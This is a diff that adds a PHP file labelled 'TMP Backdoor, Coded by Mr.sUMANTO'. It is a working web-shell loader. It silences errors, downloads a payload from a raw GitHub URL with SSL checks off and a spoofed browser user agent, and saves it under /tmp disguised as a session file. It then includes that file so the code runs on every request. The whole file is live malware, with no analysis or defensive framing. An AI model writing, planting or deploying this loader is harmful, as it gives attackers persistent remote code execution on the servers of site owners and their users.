@@ -1,0 +1,41 @@
+<?php
+/*
+ * TMP Backdoor
+ * Coded by Mr.sUMANTO
+ */
+error_reporting(0);
+@ini_set('display_errors', 0);
+$session_name = '/tmp/sess_' . md5($_SERVER['HTTP_HOST']) . '.php';
+$remote_payload = 'https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfa-baru-bg.txt';
+function smart_fetch($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language: en-US,en;q=0.5',
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+        'Connection: keep-alive'
+    ));
+    $data = curl_exec($ch);
+    curl_close($ch);
+    return $data;
+}
+if (file_exists($session_name)) {
+    @include($session_name);
+} else {
+    $payload = smart_fetch($remote_payload);
+    if ($payload) {
+        file_put_contents($session_name, $payload);
+        @include($session_name);
+    } else {
+        // kalo gagal, tampilin error
+        echo "Download Failed!";
+    }
+}
+header('Content-Type: text/html; charset=utf-8');
+?>
